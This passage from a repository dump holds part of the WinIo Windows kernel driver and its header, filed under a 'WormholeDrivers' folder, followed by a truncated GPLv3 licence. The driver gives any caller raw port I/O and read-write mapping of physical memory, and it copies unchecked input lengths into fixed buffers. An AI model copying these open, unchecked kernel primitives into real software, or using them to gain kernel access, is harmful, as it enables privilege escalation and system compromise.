	case IOCTL_WINIO_WRITEPORT:

		KdPrint(("IOCTL_WINIO_WRITEPORT"));

		if (dwInputBufferLength)
		{
			memcpy (&PortStruct, pvIOBuffer, dwInputBufferLength);

			switch (PortStruct.bSize)
			{
			case 1:
				WRITE_PORT_UCHAR((PUCHAR)(USHORT)PortStruct.wPortAddr, (UCHAR)PortStruct.dwPortVal);
				break;

			case 2:
				WRITE_PORT_USHORT((PUSHORT)(USHORT)PortStruct.wPortAddr, (USHORT)PortStruct.dwPortVal);
				break;

			case 4:
				WRITE_PORT_ULONG((PULONG)(USHORT)PortStruct.wPortAddr, PortStruct.dwPortVal);
				break;
			}
		}
		else
			Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;

		break;

	case IOCTL_WINIO_READPORT:

		KdPrint(("IOCTL_WINIO_READPORT"));

		if (dwInputBufferLength)
		{
			memcpy (&PortStruct, pvIOBuffer, dwInputBufferLength);

			switch (PortStruct.bSize)
			{
			case 1:
				PortStruct.dwPortVal = (ULONG)READ_PORT_UCHAR((PUCHAR)(USHORT)PortStruct.wPortAddr);
				break;

			case 2:
				PortStruct.dwPortVal = (ULONG)READ_PORT_USHORT((PUSHORT)(USHORT)PortStruct.wPortAddr);
				break;

			case 4:
				PortStruct.dwPortVal = READ_PORT_ULONG((PULONG)(USHORT)PortStruct.wPortAddr);
				break;
			}

			memcpy (pvIOBuffer, &PortStruct.dwPortVal, sizeof(PortStruct.dwPortVal));
			Irp->IoStatus.Information = sizeof(PortStruct.dwPortVal);
		}
		else
			Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;

		break;

	case IOCTL_WINIO_MAPPHYSTOLIN:

		KdPrint(("IOCTL_WINIO_MAPPHYSTOLIN"));

		if (dwInputBufferLength)
		{
			memcpy (&PhysStruct, pvIOBuffer, dwInputBufferLength);

			ntStatus = MapPhysicalMemoryToLinearSpace((PVOID)PhysStruct.pvPhysAddress,
				(SIZE_T)PhysStruct.dwPhysMemSizeInBytes,
				(PVOID *)&PhysStruct.pvPhysMemLin,
				(HANDLE *)&PhysStruct.PhysicalMemoryHandle,
				(PVOID *)&PhysStruct.pvPhysSection);

			if (NT_SUCCESS(ntStatus))
			{
				memcpy (pvIOBuffer, &PhysStruct, dwInputBufferLength);
				Irp->IoStatus.Information = dwInputBufferLength;
			}

			Irp->IoStatus.Status = ntStatus;
		}
		else
			Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;

		break;

	case IOCTL_WINIO_UNMAPPHYSADDR:

		KdPrint(("IOCTL_WINIO_UNMAPPHYSADDR"));

		if (dwInputBufferLength)
		{
			memcpy (&PhysStruct, pvIOBuffer, dwInputBufferLength);

			ntStatus = UnmapPhysicalMemory((HANDLE)PhysStruct.PhysicalMemoryHandle, (PVOID)PhysStruct.pvPhysMemLin, (PVOID)PhysStruct.pvPhysSection);

			Irp->IoStatus.Status = ntStatus;
		}
		else
			Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;

		break;

	default:

		KdPrint(("ERROR: Unknown IRP_MJ_DEVICE_CONTROL"));

		Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;

		break;
		}

		break;
	}

	// DON'T get cute and try to use the status field of the irp in the
	// return status.  That IRP IS GONE as soon as you call IoCompleteRequest.

	ntStatus = Irp->IoStatus.Status;

	IoCompleteRequest (Irp, IO_NO_INCREMENT);

	// We never have pending operation so always return the status code.

	KdPrint(("Leaving WinIoDispatch"));

	return ntStatus;
}

// Delete the associated device and return

void WinIoUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING DeviceLinkUnicodeString;
	NTSTATUS ntStatus;

	KdPrint(("Entering WinIoUnload"));

	RtlInitUnicodeString (&DeviceLinkUnicodeString, L"\\DosDevices\\WinIo");

	ntStatus = IoDeleteSymbolicLink (&DeviceLinkUnicodeString);

	if (NT_SUCCESS(ntStatus))
	{
		IoDeleteDevice (DriverObject->DeviceObject);
	}
	else
	{
		KdPrint(("ERROR: IoDeleteSymbolicLink"));
	}

	KdPrint(("Leaving WinIoUnload"));
}


NTSTATUS MapPhysicalMemoryToLinearSpace(PVOID pPhysAddress,
										SIZE_T PhysMemSizeInBytes,
										PVOID *ppPhysMemLin,
										HANDLE *pPhysicalMemoryHandle,
										PVOID *ppPhysSection)
{
	UNICODE_STRING     PhysicalMemoryUnicodeString;
	OBJECT_ATTRIBUTES  ObjectAttributes;
	PHYSICAL_ADDRESS   ViewBase;
	NTSTATUS           ntStatus;
	PHYSICAL_ADDRESS   pStartPhysAddress;
	PHYSICAL_ADDRESS   pEndPhysAddress;
	BOOLEAN            Result1, Result2;
	ULONG              IsIOSpace;
	unsigned char     *pbPhysMemLin = NULL;

	KdPrint(("Entering MapPhysicalMemoryToLinearSpace"));

	RtlInitUnicodeString (&PhysicalMemoryUnicodeString, L"\\Device\\PhysicalMemory");

	InitializeObjectAttributes (&ObjectAttributes,
		&PhysicalMemoryUnicodeString,
		OBJ_CASE_INSENSITIVE,
		(HANDLE) NULL,
		(PSECURITY_DESCRIPTOR) NULL);

	*pPhysicalMemoryHandle = NULL;
	*ppPhysSection = NULL;

	ntStatus = ZwOpenSection (pPhysicalMemoryHandle, SECTION_ALL_ACCESS, &ObjectAttributes);

	if (NT_SUCCESS(ntStatus))
	{

		ntStatus = ObReferenceObjectByHandle (*pPhysicalMemoryHandle,
			SECTION_ALL_ACCESS,
			(POBJECT_TYPE) NULL,
			KernelMode,
			ppPhysSection,
			(POBJECT_HANDLE_INFORMATION) NULL);

		if (NT_SUCCESS(ntStatus))
		{
			pStartPhysAddress.QuadPart = (ULONGLONG)(ULONG_PTR)pPhysAddress;

			pEndPhysAddress.QuadPart = pStartPhysAddress.QuadPart + PhysMemSizeInBytes;

			IsIOSpace = 0;

			Result1 = HalTranslateBusAddress (1, 0, pStartPhysAddress, &IsIOSpace, &pStartPhysAddress);

			IsIOSpace = 0;

			Result2 = HalTranslateBusAddress (1, 0, pEndPhysAddress, &IsIOSpace, &pEndPhysAddress);

			if (Result1 && Result2)
			{
				// Let ZwMapViewOfSection pick a linear address

				PhysMemSizeInBytes = (SIZE_T)pEndPhysAddress.QuadPart - (SIZE_T)pStartPhysAddress.QuadPart;

				ViewBase = pStartPhysAddress;

				ntStatus = ZwMapViewOfSection (*pPhysicalMemoryHandle,
					(HANDLE) -1,
					&pbPhysMemLin,
					0L,
					PhysMemSizeInBytes,
					&ViewBase,
					&PhysMemSizeInBytes,
					ViewShare,
					0,
					PAGE_READWRITE | PAGE_NOCACHE);

				// If the physical memory is already mapped with a different caching attribute, try again
				if (ntStatus == STATUS_CONFLICTING_ADDRESSES)
				{
					ntStatus = ZwMapViewOfSection (*pPhysicalMemoryHandle,
						(HANDLE) -1,
						&pbPhysMemLin,
						0L,
						PhysMemSizeInBytes,
						&ViewBase,
						&PhysMemSizeInBytes,
						ViewShare,
						0,
						PAGE_READWRITE);
				}


				if (!NT_SUCCESS(ntStatus))
					KdPrint(("ERROR: ZwMapViewOfSection failed"));
				else
				{
					pbPhysMemLin += pStartPhysAddress.QuadPart - ViewBase.QuadPart;
					*ppPhysMemLin = pbPhysMemLin;
				}  
			}
			else
				KdPrint(("ERROR: HalTranslateBusAddress failed"));
		}
		else
			KdPrint(("ERROR: ObReferenceObjectByHandle failed"));
	}
	else
		KdPrint(("ERROR: ZwOpenSection failed"));

	if (!NT_SUCCESS(ntStatus))
		ZwClose(*pPhysicalMemoryHandle);

	KdPrint(("Leaving MapPhysicalMemoryToLinearSpace"));

	return ntStatus;
}


NTSTATUS UnmapPhysicalMemory(HANDLE PhysicalMemoryHandle, PVOID pPhysMemLin, PVOID pPhysSection)
{
	NTSTATUS ntStatus;

	KdPrint(("Entering UnmapPhysicalMemory"));

	ntStatus = ZwUnmapViewOfSection((HANDLE)-1, pPhysMemLin);

	if (!NT_SUCCESS(ntStatus))
		KdPrint(("ERROR: UnmapViewOfSection failed"));

	if (pPhysSection)
		ObDereferenceObject(pPhysSection);

	ZwClose(PhysicalMemoryHandle);

	KdPrint(("Leaving UnmapPhysicalMemory"));

	return ntStatus;
}

```

`source/WormholeDrivers/WINIO/Source/Drv/winio_nt.h`:

```h
#ifndef WINIONT_H
#define WINIONT_H

// Define the various device type values.  Note that values used by Microsoft
// Corporation are in the range 0-32767, and 32768-65535 are reserved for use
// by customers.

#define FILE_DEVICE_WINIO 0x00008010

// Macro definition for defining IOCTL and FSCTL function control codes.
// Note that function codes 0-2047 are reserved for Microsoft Corporation,
// and 2048-4095 are reserved for customers.

#define WINIO_IOCTL_INDEX 0x810

// Define our own private IOCTL

#define IOCTL_WINIO_MAPPHYSTOLIN     CTL_CODE(FILE_DEVICE_WINIO,  \
	WINIO_IOCTL_INDEX,      \
	METHOD_BUFFERED,        \
	FILE_ANY_ACCESS)

#define IOCTL_WINIO_UNMAPPHYSADDR    CTL_CODE(FILE_DEVICE_WINIO,  \
	WINIO_IOCTL_INDEX + 1,  \
	METHOD_BUFFERED,        \
	FILE_ANY_ACCESS)

#define IOCTL_WINIO_ENABLEDIRECTIO   CTL_CODE(FILE_DEVICE_WINIO,  \
	WINIO_IOCTL_INDEX + 2,   \
	METHOD_BUFFERED,         \
	FILE_ANY_ACCESS)

#define IOCTL_WINIO_DISABLEDIRECTIO  CTL_CODE(FILE_DEVICE_WINIO,  \
	WINIO_IOCTL_INDEX + 3,   \
	METHOD_BUFFERED,         \
	FILE_ANY_ACCESS)

#define IOCTL_WINIO_READPORT		 CTL_CODE(FILE_DEVICE_WINIO,  \
	WINIO_IOCTL_INDEX + 4,   \
	METHOD_BUFFERED,         \
	FILE_ANY_ACCESS)

#define IOCTL_WINIO_WRITEPORT		 CTL_CODE(FILE_DEVICE_WINIO,  \
	WINIO_IOCTL_INDEX + 5,   \
	METHOD_BUFFERED,         \
	FILE_ANY_ACCESS)

#pragma pack(push)
#pragma pack(1)

struct tagPhysStruct
{
	DWORD64 dwPhysMemSizeInBytes;
	DWORD64 pvPhysAddress;
	DWORD64 PhysicalMemoryHandle;
	DWORD64 pvPhysMemLin;
	DWORD64 pvPhysSection;
};

struct tagPortStruct
{
	USHORT wPortAddr;
	ULONG dwPortVal;
	UCHAR bSize;
};

#pragma pack(pop)

#endif

```

`source/WormholeDrivers/WINRING0/LICENSE`:

```
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

                       TERMS AND CONDITIONS

  0. Definitions.

  "This License" refers to version 3 of the GNU General Public License.

  "Copyright" also means copyright-like laws that apply to other kinds of
works, such as semiconductor masks.

  "The Program" refers to any copyrightable work licensed under this
License.  Each licensee is addressed as "you".  "Licensees" and
"recipients" may be individuals or organizations.

  To "modify" a work means to copy from or adapt all or part of the work
in a fashion requiring copyright permission, other than the making of an
exact copy.  The resulting work is called a "modified version" of the
earlier work or a work "based on" the earlier work.

  A "covered work" means either the unmodified Program or a work based
on the Program.

  To "propagate" a work means to do anything with it that, without
permission, would make you directly or secondarily liable for
infringement under applicable copyright law, except executing it on a
computer or modifying a private copy.  Propagation includes copying,
distribution (with or without modification), making available to the
public, and in some countries other activities as well.

  To "convey" a work means any kind of propagation that enables other
parties to make or receive copies.  Mere interaction with a user through
a computer network, with no transfer of a copy, is not conveying.

  An interactive user interface displays "Appropriate Legal Notices"
to the extent that it includes a convenient and prominently visible
feature that (1) displays an appropriate copyright notice, and (2)
tells the user that there is no warranty for the work (except to the
extent that warranties are provided), that licensees may convey the
work under this License, and how to view a copy of this License.  If
the interface presents a list of user commands or options, such as a
menu, a prominent item in the list meets this criterion.

  1. Source Code.

  The "source code" for a work means the preferred form of the work
for making modifications to it.  "Object code" means any non-source
form of a work.

  A "Standard Interface" means an interface that either is an official
standard defined by a recognized standards body, or, in the case of
interfaces specified for a particular programming language, one that
is widely used among developers working in that language.

  The "System Libraries" of an executable work include anything, other
than the work as a whole, that (a) is included in the normal form of
packaging a Major Component, but which is not part of that Major
Component, and (b) serves only to enable use of the work with that
Major Component, or to implement a Standard Interface for which an
implementation is available to the public in source code form.  A
"Major Component", in this context, means a major essential component
(kernel, window system, and so on) of the specific operating system
(if any) on which the executable work runs, or a compiler used to
produce the work, or an object code interpreter used to run it.

  The "Corresponding Source" for a work in object code form means all
the source code needed to generate, install, and (for an executable
work) run the object code and to modify the work, including scripts to
control those activities.  However, it does not include the work's
System Libraries, or general-purpose tools or generally available free
programs which are used unmodified in performing those activities but
which are not part of the work.  For example, Corresponding Source
includes interface definition files associated with source files for
the work, and the source code for shared libraries and dynamically
linked subprograms that the work is specifically designed to require,
such as by intimate data communication or control flow between those
subprograms and other parts of the work.

  The Corresponding Source need not include anything that users
can regenerate automatically from other parts of the Corresponding
Source.

  The Corresponding Source for a work in source code form is that
same work.

  2. Basic Permissions.

  All rights granted under this License are granted for the term of
copyright on the Program, and are irrevocable provided the stated
conditions are met.  This License explicitly affirms your unlimited
permission to run the unmodified Program.  The output from running a
covered work is covered by this License only if the output, given its
content, constitutes a covered work.  This License acknowledges your
rights of fair use or other equivalent, as provided by copyright law.

  You may make, run and propagate covered works that you do not
convey, without conditions so long as your license otherwise remains
in force.  You may convey covered works to others for the sole purpose
of having them make modifications exclusively for you, or provide you
with facilities for running those works, provided that you comply with
the terms of this License in conveying all material for which you do
not control copyright.  Those thus making or running the covered works
for you must do so exclusively on your behalf, under your direction
and control, on terms that prohibit them from making any copies of
your copyrighted material outside their relationship with you.

  Conveying under any other circumstances is permitted solely under
the conditions stated below.  Sublicensing is not allowed; section 10
makes it unnecessary.

  3. Protecting Users' Legal Rights From Anti-Circumvention Law.

  No covered work shall be deemed part of an effective technological
measure under any applicable law fulfilling obligations under article
11 of the WIPO copyright treaty adopted on 20 December 1996, or
similar laws prohibiting or restricting circumvention of such
measures.

  When you convey a covered work, you waive any legal power to forbid
circumvention of technological measures to the extent such circumvention
is effected by exercising rights under this License with respect to
the covered work, and you disclaim any intention to limit operation or
modification of the work as a means of enforcing, against the work's
users, your or third parties' legal rights to forbid circumvention of
technological measures.

  4. Conveying Verbatim Copies.

  You may convey verbatim copies of the Program's source code as you
receive it, in any medium, provided that you conspicuously and
appropriately publish on each copy an appropriate copyright notice;
keep intact all notices stating that this License and any
non-permissive terms added in accord with section 7 apply to the code;
keep intact all notices of the absence of any warranty; and give all
recipients a copy of this License along with the Program.

  You may charge any price or no price for each copy that you convey,
and you may offer support or warranty protection for a fee.

  5. Conveying Modified Source Versions.

  You may convey a work based on the Program, or the modifications to
produce it from the Program, in the form of source code under the
terms of section 4, provided that you also meet all of these conditions:

    a) The work must carry prominent notices stating that you modified
    it, and giving a relevant date.

    b) The work must carry prominent notices stating that it is
    released under this License and any conditions added under section
    7.  This requirement modifies the requirement in section 4 to
    "keep intact all notices".

    c) You must license the entire work, as a whole, under this
    License to anyone who comes into possession of a copy.  This
    License will therefore apply, along with any applicable section 7
    additional terms, to the whole of the work, and all its parts,
    regardless of how they are packaged.  This License gives no
    permission to license the work in any other way, but it does not
    invalidate such permission if you have separately received it.

    d) If the work has interactive user interfaces, each must display
    Appropriate Legal Notices; however, if the Program has interactive
    interfaces that do not display Appropriate Legal Notices, your
    work need not make them do so.

  A compilation of a covered work with other separate and independent
works, which are not by their nature extensions of the covered work,
and which are not combined with it such as to form a larger program,
in or on a volume of a storage or distribution medium, is called an
"aggregate" if the compilation and its resulting copyright are not
used to limit the access or legal rights of the compilation's users
beyond what the individual works permit.  Inclusion of a covered work
in an aggregate does not cause this License to apply to the other
parts of the aggregate.

  6. Conveying Non-Source Forms.

  You may convey a covered work in object code form under the terms
of sections 4 and 5, provided that you also convey the
machine-readable Corresponding Source under the terms of this License,
in one of these ways:

    a) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by the
    Corresponding Source fixed on a durable physical medium
    customarily used for software interchange.

    b) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by a
    written offer, valid for at least three years and valid for as
    long as you offer spare parts or customer support for that product
    model, to give anyone who possesses the object code either (1) a
    copy of the Corresponding Source for all the software in the
    product that is covered by this License, on a durable physical
    medium customarily used for software interchange, for a price no
    more than your reasonable cost of physically performing this
    conveying of source, or (2) access to copy the
    Corresponding Source from a network server at no charge.

    c) Convey individual copies of the object code with a copy of the
    written offer to provide the Corresponding Source.  This
    alternative is allowed only occasionally and noncommercially, and
    only if you received the object code with such an offer, in accord
    with subsection 6b.

    d) Convey the object code by offering access from a designated
    place (gratis or for a charge), and offer equivalent access to the
    Corresponding Source in the same way through the same place at no
    further charge.  You need not require recipients to copy the
    Corresponding Source along with the object code.  If the place to
    copy the object code is a network server, the Corresponding Source
    may be on a different server (operated by you or a third party)
    that supports equivalent copying facilities, provided you maintain
    clear directions next to the object code saying where to find the
    Corresponding Source.  Regardless of what server hosts the
    Corresponding Source, you remain obligated to ensure that it is
    available for as long as needed to satisfy these requirements.

    e) Convey the object code using peer-to-peer transmission, provided
    you inform other peers where the object code and Corresponding
    Source of the work are being offered to the general public at no
    charge under subsection 6d.

  A separable portion of the object code, whose source code is excluded
from the Corresponding Source as a System Library, need not be
included in conveying the object code work.

  A "User Product" is either (1) a "consumer product", which means any
tangible personal property which is normally used for personal, family,
or household purposes, or (2) anything designed or sold for incorporation
into a dwelling.  In determining whether a product is a consumer product,
doubtful cases shall be resolved in favor of coverage.  For a particular
product received by a particular user, "normally used" refers to a
typical or common use of that class of product, regardless of the status
of the particular user or of the way in which the particular user
actually uses, or expects or is expected to use, the product.  A product
is a consumer product regardless of whether the product has substantial
commercial, industrial or non-consumer uses, unless such uses represent
the only significant mode of use of the product.

  "Installation Information" for a User Product means any methods,
procedures, authorization keys, or other information required to install
and execute modified versions of a covered work in that User Product from
a modified version of its Corresponding Source.  The information must
suffice to ensure that the continued functioning of the modified object
code is in no case prevented or interfered with solely because
modification has been made.

  If you convey an object code work under this section in, or with, or
specifically for use in, a User Product, and the conveying occurs as
part of a transaction in which the right of possession and use of the
User Product is transferred to the recipient in perpetuity or for a
fixed term (regardless of how the transaction is characterized), the
Corresponding Source conveyed under this section must be accompanied
by the Installation Information.  But this requirement does not apply
if neither you nor any third party retains the ability to install
modified object code on the User Product (for example, the work has
been installed in ROM).

  The requirement to provide Installation Information does not include a
requirement to continue to provide support service, warranty, or updates
for a work that has been modified or installed by the recipient, or for
the User Product in which it has been modified or installed.  Access to a
network may be denied when the modification itself materially and
adversely affects the operation of the network or violates the rules and
protocols for communication across the network.

  Corresponding Source conveyed, and Installation Information provided,
in accord with this section must be in a format that is publicly
documented (and with an implementation available to the public in
source code form), and must require no special password or key for
unpacking, reading or copying.

  7. Additional Terms.

  "Additional permissions" are terms that supplement the terms of this
License by making exceptions from one or more of its conditions.
Additional permissions that are applicable to the entire Program shall
be treated as though they were included in this License, to the extent
that they are valid under applicable law.  If additional permissions
apply only to part of the Program, that part may be used separately
under those permissions, but the entire Program remains governed by
this License without regard to the additional permissions.

  When you convey a copy of a covered work, you may at your option
remove any additional permissions from that copy, or from any part of
it.  (Additional permissions may be written to require their own
removal in certain cases when you modify the work.)  You may place
additional permissions on material, added by you to a covered work,
for which you have or can give appropriate copyright permission.

  Notwithstanding any other provision of this License, for material you
add to a covered work, you may (if authorized by the copyright holders of
that material) supplement the terms of this License with terms:

    a) Disclaiming warranty or limiting liability differently from the
    terms of sections 15 and 16 of this License; or

    b) Requiring preservation of specified reasonable legal notices or
    author attributions in that material or in the Appropriate Legal
    Notices displayed by works containing it; or

    c) Prohibiting misrepresentation of the origin of that material, or
    requiring that modified versions of such material be marked in
    reasonable ways as different from the original version; or

    d) Limiting the use for publicity purposes of names of licensors or
    authors of the material; or

    e) Declining to grant rights under trademark law for use of some
    trade names, trademarks, or service marks; or

    f) Requiring indemnification of licensors and authors of that
    material by anyone who conveys the material (or modified versions of
    it) with contractual assumptions of liability to the recipient, for
    any liability that these contractual assumptions directly impose on
    those licensors and authors.

  All other non-permissive additional terms are considered "further
restrictions" within the meaning of section 10.  If the Program as you
received it, or any part of it, contains a notice stating that it is
governed by this License along with a term that is a further
restriction, you may remove that term.  If a license document contains
a further restriction but permits relicensing or conveying under this
License, you may add to a covered work material governed by the terms
of that license document, provided that the further restriction does
not survive such relicensing or conveying.

  If you add terms to a covered work in accord with this section, you
must place, in the relevant source files, a statement of the
additional terms that apply to those files, or a notice indicating
where to find the applicable terms.

  Additional terms, permissive or non-permissive, may be stated in the
form of a separately written license, or stated as exceptions;
the above requirements apply either way.

  8. Termination.

  You may not propagate or modify a covered work except as expressly
provided under this License.  Any attempt otherwise to propagate or
modify it is void, and will automatically terminate your rights under
this License (including any patent licenses granted under the third
paragraph of section 11).

  However, if you cease all violation of this License, then your
license from a particular copyright holder is reinstated (a)
provisionally, unless and until the copyright holder explicitly and
finally terminates your license, and (b) permanently, if the copyright
holder fails to notify you of the violation by some reasonable means
prior to 60 days after the cessation.

  Moreover, your license from a particular copyright holder is
reinstated permanently if the copyright holder notifies you of the
violation by some reasonable means, this is the first time you have
received notice of violation of this License (for any work) from that
copyright holder, and you cure the violation prior to 30 days after
your receipt of the notice.

  Termination of your rights under this section does not terminate the
licenses of parties who have received copies or rights from you under
this License.  If your rights have been terminated and not permanently
reinstated, you do not qualify to receive new licenses for the same
material under section 10.

  9. Acceptance Not Required for Having Copies.

  You are not required to accept this License in order to receive or
run a copy of the Program.  Ancillary propagation of a covered work
occurring solely as a consequence of using peer-to-peer transmission
to receive a copy likewise does not require acceptance.  However,
nothing other than this License grants you permission to propagate or
modify any covered work.  These actions infringe copyright if you do
not accept this License.  Therefore, by modifying or propagating a
covered work, you indicate your acceptance of this License to do so.

  10. Automatic Licensing of Downstream Recipients.

  Each time you convey a covered work, the recipient automatically
receives a license from the original licensors, to run, modify and
propagate that work, subject to this License.  You are not responsible
for enforcing compliance by third parties with this License.

  An "entity transaction" is a transaction transferring control of an
organization, or substantially all assets of one, or subdividing an
organization, or merging organizations.  If propagation of a covered
work results from an entity transaction, each party to that
transaction who receives a copy of the work also receives whatever
licenses to the work the party's predecessor in interest had or could
give under the previous paragraph, plus a right to possession of the
Corresponding Source of the work from the predecessor in interest, if
the predecessor has it or can get it with reasonable efforts.

  You may not impose any further restrictions on the exercise of the
rights granted or affirmed under this License.  For example, you may
not impose a license fee, royalty, or other charge for exercise of
rights granted under this License, and you may not initiate litigation
(including a cross-claim or counterclaim in a lawsuit) alleging that
any patent claim is infringed by making, using, selling, offering for
sale, or importing the Program or any portion of it.

  11. Patents.

  A "contributor" is a copyright holder who authorizes use under this
License of the Program or a work on which the Program is based.  The
work thus licensed is called the contributor's "contributor version".

  A contributor's "essential patent claims" are all patent claims
owned or controlled by the contributor, whether already acquired or
hereafter acquired, that would be infringed by some manner, permitted
by this License, of making, using, or selling its contributor version,
but do not include claims that would be infringed only as a
consequence of further modification of the contributor version.  For
purposes of this definition, "control" includes the right to grant
patent sublicenses in a manner consistent with the requirements of
this License.

  Each contributor grants you a non-exclusive, worldwide, royalty-free
patent license under the contributor's essential patent claims, to
make, use, sell, offer for sale, import and otherwise run, modify and
propagate the contents of its contributor version.

  In the following three paragraphs, a "patent license" is any express
agreement or commitment, however denominated, not to enforce a patent
(such as an express permission to practice a patent or covenant not to
sue for patent infringement).  To "grant" such a patent license to a
party means to make such an agreement or commitment not to enforce a
patent against the party.

  If you convey a covered work, knowingly relying on a patent license,
and the Corresponding Source of the work is not available for anyone
to copy, free of charge and under the terms of this License, through a
publicly available network server or other readily accessible means,
then you must either (1) cause the Corresponding Source to be so
available, or (2) arrange to deprive yourself of the benefit of the
patent license for this particular work, or (3) arrange, in a manner
consistent with the requirements of this License, to extend the patent
license to downstream recipients.  "Knowingly relying" means you have
actual knowledge that, but for the patent license, your conveying the
covered work in a country, or your recipient's use of the covered work
in a country, would infringe one or more identifiable patents in that
country that you have reason to believe are valid.

  If, pursuant to or in connection with a single transaction or
arrangement, you convey, or propagate by procuring conveyance of, a
covered work, and grant a patent license to some of the parties
receiving the covered work authorizing them to use, propagate, modify
or convey a specific copy of the covered work, then the patent license
you grant is automatically extended to all recipients of the covered
work and works based on it.

  A patent license is "discriminatory" if it does not include within
the scope of its coverage, prohibits the exercise of, or is
conditioned on the non-exercise of one or more of the rights that are
specifically granted under this License.  You may not convey a covered
work if you are a party to an arrangement with a third party that is
in the business of distributing software, under which you make payment
to the third party based on the extent of your activity of conveying
the work, and under which the third party grants, to any of the
parties who would receive the covered work from you, a discriminatory
patent license (a) in connection with copies of the covered work
conveyed by you (or copies made from those copies), or (b) primarily
for and in connection with specific products or compilations that
contain the covered work, unless you entered into that arrangement,
or that patent license was granted, prior to 28 March 2007.

  Nothing in this License shall be construed as excluding or limiting
any implied license or other defenses to infringement that may
otherwise be available to you under applicable patent law.

  12. No Surrender of Others' Freedom.

  If conditions are imposed on you (whether by court order, agreement or
otherwise) that contradict the conditions of this License, they do not
excuse you from the conditions of this License.  If you cannot convey a
covered work so as to satisfy simultaneously your obligations under this
License and any other pertinent obligations, then as a consequence you may
not convey it at all.  For example, if you agree to terms that obligate you
to collect a royalty for further conveying from those to whom you convey
the Program, the only way you could satisfy both those terms and this
License would be to refrain entirely from conveying the Program.

  13. Use with the GNU Affero General Public License.

  Notwithstanding any other provision of this License, you have
permission to link or combine any covered work with a work licensed
under version 3 of the GNU Affero General Public License into a single
combined work, and to convey the resulting work.  The terms of this
License will continue to apply to the part which is the covered work,
but the special requirements of the GNU Affero General Public License,
section 13, concerning interaction through a network will apply to the
combination as such.

  14. Revised Versions of this License.

  The Free Software Foundation may publish revised and/or new versions of
the GNU General Public License from time to time.  Such new versions will
be similar in spirit to the present version, but may differ in detail to
address new problems or concerns.

  Each version is given a distinguishing version number.  If the
Program specifies that a certain numbered version of the GNU General
Public License "or any later version" applies to it, you have the
option of following the terms and conditions either of that numbered
version or of any later version published by the Free Software
Foundation.  If the Program does not specify a version number of the
GNU General Public License, you may choose any version ever published
by the Free Software Foundation.

  If the Program specifies that a proxy can decide which future
versions of the GNU General Public License can be used, that proxy's
public statement of acceptance of a version permanently authorizes you
to choose that version for the Program.

  Later license versions may give you additional or different
permissions.  However, no additional obligations are imposed on any
author or copyright holder as a result of your choosing to follow a
later version.

  15. Disclaimer of Warranty.

  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY
OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
ALL NECESSARY SERVICING, REPAIR OR CORRECTION.

  16. Limitation of Liability.

  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS
THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE
USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),
